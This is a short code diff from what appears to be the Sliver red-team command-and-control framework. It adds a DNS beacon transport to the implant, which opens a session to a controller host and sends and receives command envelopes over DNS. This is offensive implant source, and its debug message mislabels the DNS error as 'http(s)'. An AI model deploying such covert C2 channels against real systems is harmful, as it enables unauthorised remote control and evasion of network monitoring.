@@ -33,6 +33,7 @@ import (
 	// {{if .Config.MTLSc2Enabled}}
 	"crypto/tls"
 
+	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
 
 	// {{end}}
@@ -307,7 +308,31 @@ func httpBeacon(uri *url.URL) *Beacon {
 
 // {{if .Config.DNSc2Enabled}}
 func dnsBeacon(uri *url.URL) *Beacon {
-	return nil
+	var client *dnsclient.SliverDNSClient
+	var err error
+	beacon := &Beacon{
+		Start: func() error {
+			timeout := GetPollTimeout()
+			client, err = dnsclient.DNSStartSession(uri.Host, timeout, timeout)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] http(s) connection error %s", err)
+				// {{end}}
+				return err
+			}
+			return nil
+		},
+		Recv: func() (*pb.Envelope, error) {
+			return client.ReadEnvelope()
+		},
+		Send: func(envelope *pb.Envelope) error {
+			return client.WriteEnvelope(envelope)
+		},
+		Close: func() error {
+			return client.CloseSession()
+		},
+	}
+	return beacon
 }
 
 // {{end}}
